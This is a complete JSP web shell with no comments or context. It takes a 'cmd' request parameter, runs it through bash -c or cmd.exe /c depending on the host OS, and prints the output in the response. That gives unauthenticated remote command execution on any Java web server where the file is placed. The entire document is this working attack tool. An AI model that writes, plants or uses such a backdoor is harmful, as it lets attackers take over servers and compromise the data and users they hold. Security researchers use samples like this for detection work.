<%@ page import="java.lang.*, java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String output = "";
    if (cmd != null) {
        String s = null;
        try {
            String os = System.getProperty("os.name");
            String exe = "/bin/bash";
            String arg = "-c";
            if (os.contains("Windows")) {
                exe = "cmd.exe";
                arg = "/c";
            }
            Process p = Runtime.getRuntime().exec(new String[]{exe, arg, cmd});
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((s = sI.readLine()) != null) {
                output += s + "\n";
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
%>
<%= output %>
